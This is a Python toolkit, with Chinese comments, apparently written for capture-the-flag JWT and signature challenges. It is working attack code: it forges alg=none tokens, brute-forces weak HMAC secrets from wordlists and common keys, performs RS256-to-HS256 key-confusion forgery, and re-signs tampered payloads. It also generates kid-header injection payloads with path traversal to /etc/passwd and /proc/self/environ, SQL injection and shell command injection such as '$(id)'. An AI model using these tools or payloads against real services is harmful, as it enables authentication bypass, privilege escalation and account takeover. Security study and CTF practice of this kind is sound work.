#!/usr/bin/env python3
"""签名类题工具包 —— 给「一枚签名的重量」这类题用。

子命令:
  decode   <token>                       解析 header/payload, 并从签名长度推断算法族
  none     <token> [payload_json]        生成 alg=none / None / NONE 变体
  brute    <token> --dict <wordlist>     HS256/384/512 弱密钥爆破
  confuse  <token> --pubkey <pem>        RS256 -> HS256 公钥混淆
  kid      <token>                       生成 kid 注入变体(路径穿越/命令注入/SQLi)
  tamper   <token> --set k=v            改 payload 后重签(配合 brute 出的密钥)

只对题目靶机使用。
"""
import argparse, base64, hashlib, hmac, json, sys


def b64d(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())


def b64e(b):
    if isinstance(b, str):
        b = b.encode()
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def split(tok):
    p = tok.split(".")
    if len(p) < 2:
        sys.exit("不是 JWT: 段数=%d" % len(p))
    return p


def parse(tok):
    p = split(tok)
    hdr = json.loads(b64d(p[0]))
    pl = json.loads(b64d(p[1])) if len(p) > 1 and p[1] else {}
    sig = p[2] if len(p) > 2 else ""
    return hdr, pl, sig


def sig_bytes(sig):
    try:
        return len(b64d(sig))
    except Exception:
        return 0


def guess_family(siglen):
    # 常见: HS256=32, HS384=48, HS512=64, RSA2048=256, RSA4096=512, ES256=64(r||s), ES512=132
    table = {32: "HMAC-SHA256 或 ES256 的 r||s", 48: "HMAC-SHA384", 64: "HMAC-SHA512 或 ES256",
             96: "ES384", 132: "ES512", 256: "RSA-2048", 128: "RSA-1024", 512: "RSA-4096"}
    return table.get(siglen, "未知长度 %d" % siglen)


def sign_hs(data, key, alg):
    h = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
    return b64e(hmac.new(key.encode() if isinstance(key, str) else key, data.encode(), h).digest())


def cmd_decode(a):
    hdr, pl, sig = parse(a.token)
    print("[header ]", json.dumps(hdr, ensure_ascii=False))
    print("[payload]", json.dumps(pl, ensure_ascii=False, indent=1))
    n = sig_bytes(sig)
    print("[sig    ] %d 字节 -> 推断: %s" % (n, guess_family(n)))
    if "kid" in hdr:
        print("[!] header 里有 kid，试试 kid 注入")
    print("[!] 若是裸签名(非JWT)题，关注 RSA 的 e 是否过小 / ECDSA 是否 nonce 复用 / 哈希是否可延展")


def cmd_none(a):
    hdr, pl, _ = parse(a.token)
    if a.payload:
        pl = json.loads(a.payload)
    for alg in ("none", "None", "NONE", "nOnE"):
        for tail in ("", ".", "e30"):   # 空签名 / 只有点 / 空 payload
            h = dict(hdr); h["alg"] = alg
            print("%s.%s.%s" % (b64e(json.dumps(h, separators=(",", ":"))),
                                b64e(json.dumps(pl, separators=(",", ":"))), tail))


def cmd_brute(a):
    hdr, pl, sig = parse(a.token)
    alg = hdr.get("alg", "HS256")
    if alg not in ("HS256", "HS384", "HS512"):
        print("[!] header.alg=%s 不是 HMAC，先改 header 为 HS256 再爆(或走 confuse)" % alg)
    p = split(a.token)
    data = p[0] + "." + p[1]
    words = []
    for f in a.dict:
        with open(f, "r", encoding="utf-8", errors="replace") as fh:
            words += [w.strip() for w in fh if w.strip()]
    words += ["secret", "key", "password", "123456", "admin", "jwt", "flag", "htu", "htuctf",
              "secretkey", "changeme", "test", "root", "sign", "signature"]
    seen = set()
    for i, w in enumerate(words):
        if w in seen:
            continue
        seen.add(w)
        if sign_hs(data, w, alg) == p[2]:
            print("[+] 命中密钥: %r" % w)
            return
        if i % 500 == 0 and i:
            sys.stderr.write("\r[%d] %s" % (i, w[:20]))
    print("[-] 字典跑完未命中")


def cmd_confuse(a):
    hdr, pl, _ = parse(a.token)
    h = dict(hdr); h["alg"] = "HS256"
    with open(a.pubkey, "r", encoding="utf-8", errors="replace") as f:
        pub = f.read()
    for key in (pub, pub.strip(), pub.replace("\n", "")):
        data = b64e(json.dumps(h, separators=(",", ":"))) + "." + b64e(json.dumps(pl, separators=(",", ":")))
        print("%s.%s" % (data, sign_hs(data, key, "HS256")))


def cmd_kid(a):
    hdr, pl, _ = parse(a.token)
    payloads = ["../../../../etc/passwd", "../../../../dev/null", "/dev/null", "/proc/self/environ",
                "a' UNION SELECT 'k'--", "k'||(SELECT 'x')||'", "|id", ";id", "$(id)", "`id`",
                "../../app/static/key.pem", "file:///etc/passwd"]
    for k in payloads:
        h = dict(hdr); h["kid"] = k
        data = b64e(json.dumps(h, separators=(",", ":"))) + "." + b64e(json.dumps(pl, separators=(",", ":")))
        print("%-40s %s.XXX" % (k, data))


def cmd_tamper(a):
    hdr, pl, _ = parse(a.token)
    for kv in a.set:
        k, v = kv.split("=", 1)
        try:
            v = json.loads(v)
        except Exception:
            pass
        pl[k] = v
    h = dict(hdr); h["alg"] = a.alg
    data = b64e(json.dumps(h, separators=(",", ":"))) + "." + b64e(json.dumps(pl, separators=(",", ":")))
    print(data + "." + sign_hs(data, a.key, a.alg))


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)
    s = sub.add_parser("decode"); s.add_argument("token"); s.set_defaults(f=cmd_decode)
    s = sub.add_parser("none"); s.add_argument("token"); s.add_argument("payload", nargs="?"); s.set_defaults(f=cmd_none)
    s = sub.add_parser("brute"); s.add_argument("token"); s.add_argument("--dict", action="append", default=[]); s.set_defaults(f=cmd_brute)
    s = sub.add_parser("confuse"); s.add_argument("token"); s.add_argument("--pubkey", required=True); s.set_defaults(f=cmd_confuse)
    s = sub.add_parser("kid"); s.add_argument("token"); s.set_defaults(f=cmd_kid)
    s = sub.add_parser("tamper"); s.add_argument("token"); s.add_argument("--set", action="append", default=[])
    s.add_argument("--key", required=True); s.add_argument("--alg", default="HS256"); s.set_defaults(f=cmd_tamper)
    a = ap.parse_args()
    a.f(a)
